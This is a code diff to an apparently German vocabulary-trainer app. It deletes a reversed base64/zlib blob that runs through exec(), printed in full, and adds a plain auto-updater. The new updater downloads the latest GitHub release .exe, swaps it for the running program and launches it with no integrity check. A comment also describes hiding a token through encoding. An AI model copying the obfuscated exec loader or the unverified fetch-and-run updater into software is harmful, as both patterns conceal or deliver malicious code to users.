@@ -1783,16 +1783,84 @@ start_updater()
 
 def start_updater():
     import threading
-    import base64
-    import zlib
-    def run_updater():
+    def check_for_updates_background():
+        import urllib.request
+        import subprocess
+        import sys
+        import tempfile
+        import os
+        import json
+        import shutil
+        import base64
+        import zlib
         try:
-            c = "rjZy5eA/KpTP9ktpD29FgRK9pQv2RzrQp9Wg7dxJd/QyA89jlin0tcZKz9zFcb14tj9P/PNuPBFCqIwfNo7cMk2ZQmDAy9P9f+q7G9audcJFJ8PHD7ULIfnhY+X4TeMluNRFhFda3dPcmg6CYZ0ORr+SwGMdUsG1WhqowMdmQwvCW039FL5fM1JjqTIbDyAOLnqTscvCNHyUkCbMHHHFt0vl/UkABulfjBqFBo6C8NRqpcAofjhAvgNK9WgJ6u2GHO8cpBewvCraHM+RL03WRHV0K/z0FtCRwDR20hjXCn6wyS0veayejuY95f1oZCZF/uO7IQptbteC0h880Shl7QO2SPoNaRPmJ71R1K2A7QDCDUkma5N1S0zjP4j2hJwsx60wHiseAlRQRmm2VZHy00ac1qjxip/i84XL+uOEJm2/sGi2ngItAf/jHbgmmMeiwPoqJvS4NpJO7oiFNW8bII6cB5WM4cGclZnC2GnZSe3hJjAKDPfKhtxL+TYlGnjp0sOv/9+5/jHu+lVe5xmFPXETVPHKmUfMdmczkjgqDjOpGHpZI+uVXxrjpNy0QLPTUaBwhKH0ZOg30ZhzZB7OSPvjrD9pgxhN4/UXdJqjEtexaQIyH4Bq9gKdIuiT4LPGpmiUVsT0yeIsYZUD/QyhtnMZCTrOCNPIjIjQfXhK+GELFScF8ThcyhKxlyruHyLyz3cK/7D21zSg6SdDVI9JngM9dc5GNjUXHigUcWGiSIuDWxY5KuDjl7lL9AqtoMWP0XGQt9Up1KTodM+RmjnYIHS2K6ws/8Ney+YjS3jOaprczNe3PdZvmsNZXXqWUEH3WZNu0rbVxHMk4KtdFZMSyVRA9eE181PLiva+yL1E+2K9z6JmQtylPDbO/V6PedEWNA+afekJcA4ybGI3J0SoNmsA8ezq+pn99h3vG7f4/uJtgd7O6RdV95KBsCVSP/5ONGBrWuwZlGBu/0hEqcLosAb77JvDXui9zUKQvv6WLlBnRtJRyFwWjoUZ762l+cc7E0JkjqdwIvqT3oxRMFLhFmWrE+0ofQ6icqh6Gflz7csDP8R4hVFFl+mMtM6WSEth//DLa+qaK386FXGcH1wNlabrU6dovalWGg+c/+xv8oDSMMyJVER2l4A2+GYfcYfT0PldwIfOmgZzRKNUgE0F1dYQ2BNGsZLM+Cg1d060VyMJFqNsT9tvUYz2u1tVFyJe"[::-1]
-            exec(zlib.decompress(base64.b64decode(c)).decode('utf-8'), globals())
-            globals()['check_for_updates_background']()
-        except:
+            if not getattr(sys, 'frozen', False):
+                return
+                
+            api_u = "https://api.github.com/repos/Lauju1909/vokabelapp/releases/latest"
+            headers = {'User-Agent': 'Mozilla/5.0'}
+            
+            # HIER LIEGT DER VERSCHLUESSELTE TOKEN (aktuell leer)
+            # Um deinen Token zu verschluesseln, nutze in einer Python-Konsole:
+            # import base64, zlib; print(base64.b64encode(zlib.compress(b"DEIN_TOKEN")).decode('utf-8'))
+            ENCRYPTED_TOKEN = "" 
+            
+            token = zlib.decompress(base64.b64decode(ENCRYPTED_TOKEN)).decode('utf-8') if ENCRYPTED_TOKEN else ""
+            if token:
+                headers['Authorization'] = f"token {token}"
+                
+            req = urllib.request.Request(api_u, headers=headers)
+            with urllib.request.urlopen(req, timeout=5) as response:
+                data = json.loads(response.read().decode('utf-8'))
+                latest_version = data.get("tag_name", "").lstrip("vV")
+                
+                # App Name dynamisch anhand des Dateinamens (lehrer.exe, schueler.exe, vokabeltrainer.exe) bestimmen
+                import os
+                current_name = os.path.basename(sys.executable).lower()
+                if "lehrer" in current_name: app_name = "lehrer"
+                elif "schueler" in current_name: app_name = "schueler"
+                else: app_name = "vokabeltrainer"
+                
+                exe_download_url = None
+                for asset in data.get("assets", []):
+                    if asset.get("name", "").lower() == f"{app_name}.exe":
+                        exe_download_url = asset.get("browser_download_url")
+                        break
+                        
+            if latest_version and latest_version != APP_VERSION and exe_download_url:
+                temp_dir = tempfile.gettempdir()
+                new_exe_path = os.path.join(temp_dir, f"{app_name}_new.exe")
+                
+                req_exe = urllib.request.Request(exe_download_url, headers=headers)
+                with urllib.request.urlopen(req_exe, timeout=60) as response, open(new_exe_path, 'wb') as out_file:
+                    out_file.write(response.read())
+                    
+                current_exe = sys.executable
+                old_exe = current_exe + ".old"
+                
+                # ALTE EXE LOESCHEN: Wird beim Start des NEUEN Updates durchgefuehrt!
+                if os.path.exists(old_exe):
+                    try:
+                        os.remove(old_exe)
+                    except:
+                        pass
+                        
+                # Aktuelle EXE umbenennen (erlaubt unter Windows trotz Ausfuehrung)
+                os.rename(current_exe, old_exe)
+                
+                # Neue EXE an den richtigen Platz schieben
+                shutil.move(new_exe_path, current_exe)
+                
+                # Neue EXE starten
+                subprocess.Popen([current_exe])
+                
+                # Alte App sofort beenden
+                import wx
+                wx.CallAfter(wx.GetApp().ExitMainLoop)
+        except Exception:
             pass
-    threading.Thread(target=run_updater, daemon=True).start()
+            
+    threading.Thread(target=check_for_updates_background, daemon=True).start()
 
 start_updater()
 
